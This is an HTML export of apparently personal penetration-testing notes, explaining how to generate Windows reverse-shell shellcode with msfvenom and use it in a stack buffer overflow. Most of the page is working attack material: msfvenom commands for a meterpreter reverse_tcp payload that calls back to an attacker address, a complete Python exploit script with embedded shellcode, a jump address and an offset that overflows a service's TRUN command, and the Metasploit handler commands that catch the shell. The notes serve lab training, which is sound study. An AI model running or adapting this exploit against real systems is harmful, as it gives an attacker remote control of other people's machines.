<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Generating Shellcode and gaining shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Generating Shellcode and gaining shell</h1><br/><strong>Generate Shellcode</strong><br />Review the chapter <a href="Home--Penetration_Test_Methodology--System_Security_(Windows_&_Linux)--Shellcoding.html">Shellcoding</a> and in particular <a href="Home--Penetration_Test_Methodology--System_Security_(Windows_&_Linux)--Shellcoding--Automate_creation_of_shellcode.html">Automate creation of a shellcode</a><br /><span style="text-decoration:underline;">msfvenom</span> is a combination of the old msfpayload and msfencode, putting both of these tools into a single Framework<br />   ◇ msfpayload → generate the malicious payload<br />   ◇ msfencode → encode the payload in order to avoid bad characters<br />1. List available payloads:<br />	<div class="codebox"><pre>msfvenom --<span style="color:#ff9d00;font-weight:700">list</span> payloads</pre></div><br />2. Show options for a payload<br />	<div class="codebox"><pre>msfvenom -p &lt;name_of_the_msfvenom_payload&gt; --list-options</pre></div><br /><br /><strong>Shellcode reverse shell</strong><br /><div class="codebox"><pre>msfvenom --<span style="color:#ff9d00;font-weight:700">list</span> payloads</pre></div><br />In this example we will use windows/shell_reverse_tcp that connect back to attacker and spawn a command shell<br /><div class="codebox"><pre>msfvenom -p windows/shell_reverse_tcp --list-options</pre></div><br />	<a href=""><img src="images/2142-1.png" alt="images/2142-1.png" /></a><br />	<br /><div class="codebox"><pre>msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp LHOST=192.168.1.121 LPORT=4444 -a x86 --platform Windows -b <span style="color:#3ad900;font-weight:400">&#39;\x00&#39;</span> EXITFUNC=thread -f c</pre></div> <br />	copy it without the semicolon at the end<br />	<a href=""><img src="images/2142-2.png" alt="images/2142-2.png" /></a><br /><br />In the script change the value of <br />• shellcode → with the shellcode generated now<br />• jmp_address → found in the chapter “Find the right module for JMP ESP” at point 3<br />• eip_address_location with the value found in the chapter “Find the Offset”<br />• s.connect with address and port of the service<br />• s.send with the value of the command of the service<br /><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br />import socket<br />import sys<br />from time import <span style="color:#ff9d00;font-weight:700">sleep</span><br /><br />jmp_address = <span style="color:#3ad900;font-weight:400">&#39;\xAF\x11\x50\x62&#39;</span><br />eip_address_location = 2003<br />nops = <span style="color:#3ad900;font-weight:400">&#39;\x90&#39;</span> * 32   <span style="color:#0088ff;font-weight:400">#if we are limited in space for the payload riduce this padding</span><br />shellcode = <span style="color:#ff9d00;font-weight:700">(</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xd9\xc8\xd9\x74\x24\xf4\xbf\xb1\x83\x7e\x56\x5e\x31\xc9\xb1&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x5e\x31\x7e\x1a\x83\xc6\x04\x03\x7e\x16\xe2\x44\x7f\x96\xd9&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xa6\x80\x67\x86\x97\x52\x03\xcd\x85\x62\x45\x34\xa2\xd1\x59&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x3c\xe6\xc1\x6e\xf5\x4c\xcc\xfb\x8b\x78\x21\x03\x5a\xb8\xed&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xc7\xfc\x44\xec\x1b\xdf\x75\x3f\x6e\x1e\xb2\x89\x04\xcf\x6e&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x5d\x6c\x5d\x9e\xea\x30\x5e\x9f\x3c\x3f\xde\xe7\x39\x80\xab&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x5b\x43\xd1\xdf\x2b\x5b\x5a\x87\x8b\x0b\x5d\xeb\x4e\x62\x29&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x37\x19\x44\x2d\xcc\xad\x2d\xd0\x05\xfc\xf1\x7f\x68\x31\xfc&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x7e\xac\xf5\x1f\xf5\xc6\x06\x9d\x0e\x1d\x75\x79\x9a\x82\xdd&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x0a\x3c\x67\xdc\xdf\xdb\xec\xd2\x94\xa8\xab\xf6\x2b\x7c\xc0&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x02\xa7\x83\x07\x83\xf3\xa7\x83\xc8\xa0\xc6\x92\xb4\x07\xf6&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xc5\x10\xf7\x52\x8d\xb2\xee\xe3\x6e\x4d\x0f\xbe\xf8\x82\xc2&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x41\xf9\x8c\x55\x31\xcb\x13\xce\xdd\x67\xdc\xc8\x1a\xf1\xca&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xea\xf5\xb9\x9a\x14\xf6\xb9\xb3\xd2\xa2\xe9\xab\xf3\xca\x61&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x2b\xfb\x1e\x1f\x21\x6b\x61\x48\x34\x12\x09\x8b\x36\xf5\x95&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x02\xd0\xa5\x75\x45\x4c\x06\x26\x25\x3c\xee\x2c\xaa\x63\x0e&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x4f\x60\x0c\xa5\xa0\xdd\x65\x52\x58\x44\xfd\xc3\xa5\x52\x78&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xc3\x2e\x57\x7d\x8a\xc6\x12\x6d\xfb\xb0\xdc\x6d\xfc\x54\xdd&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x07\xf8\xfe\x8a\xbf\x02\x26\xfc\x60\xfc\x0d\x7e\x66\x02\xd0&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xb7\x1d\x35\x46\xf8\x49\x3a\x86\xf8\x89\x6c\xcc\xf8\xe1\xc8&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xb4\xaa\x14\x17\x61\xdf\x85\x82\x8a\xb6\x7a\x04\xe3\x34\xa5&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x62\xac\xc7\x80\xf0\xab\x38\x57\xdf\x13\x51\xa7\x5f\xa4\xa1&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xcd\x5f\xf4\xc9\x1a\x4f\xfb\x39\xe3\x5a\x54\x52\x6e\x0b\x16&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xc3\x6f\x06\xf6\x5d\x70\xa5\x23\x6d\x0b\xc6\xd4\x8e\xec\xce&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xb0\x8e\xed\xee\xc6\xb3\x38\xd7\xbc\xf2\xf9\x6c\xde\xe8\xd7&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x98\x77\xb5\xb2\x20\x1a\x46\x69\x66\x23\xc5\x9b\x17\xd0\xd5&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xee\x12\x9c\x51\x03\x6f\x8d\x37\x23\xdc\xae\x1d&quot;</span><span style="color:#ff9d00;font-weight:700">)</span><br /><br />buffer = <span style="color:#3ad900;font-weight:400">&#39;A&#39;</span> * eip_address_location + jmp_address + nops + shellcode<br /><br />try<span style="color:#ff9d00;font-weight:700">:</span><br />  <span style="color:#7f0044;font-weight:400">s</span>=socket.socket<span style="color:#ff9d00;font-weight:700">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#ff9d00;font-weight:700">)</span><br />  s.settimeout<span style="color:#ff9d00;font-weight:700">(</span>2<span style="color:#ff9d00;font-weight:700">)</span><br />  s.connect<span style="color:#ff9d00;font-weight:700">((</span><span style="color:#3ad900;font-weight:400">&#39;192.168.1.118&#39;</span>,9999<span style="color:#ff9d00;font-weight:700">))</span><br />  s.recv<span style="color:#ff9d00;font-weight:700">(</span>1024<span style="color:#ff9d00;font-weight:700">)</span><br />  <br />  print <span style="color:#3ad900;font-weight:400">&#39;[*] Sending buffer.&#39;</span><br />  s.send<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;TRUN /.:/&#39;</span> + buffer + <span style="color:#3ad900;font-weight:400">&#39;\r\n&#39;</span><span style="color:#ff9d00;font-weight:700">)</span>                <span style="color:#0088ff;font-weight:400">#target the TRUN command</span><br />  s.<span style="color:#ffdd00;font-weight:400">close()</span><br />  <br />except<span style="color:#ff9d00;font-weight:700">:</span><br />  print <span style="color:#3ad900;font-weight:400">&#39;[*] Could not connect to target, exiting.&#39;</span><br />  sys.<span style="color:#ffdd00;font-weight:400">exit()</span></pre></div><br /><br /><br />Set up the Handler<br /><div class="codebox"><pre>msf&gt; use <span style="color:#ff9d00;font-weight:700">/</span>exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> payload windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> lhost ...<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> lport ...<br />msf&gt; run -j</pre></div><br /><br /><br />Run the script from the attacker<br /><div class="codebox"><pre>.<span style="color:#ff9d00;font-weight:700">/</span>fuzzing.py</pre></div><br /><br /><br />Now we should have catch the reverse shell<br />    <a href=""><img src="images/2142-3.png" alt="images/2142-3.png" /></a><br /></div>
</body>
</html>
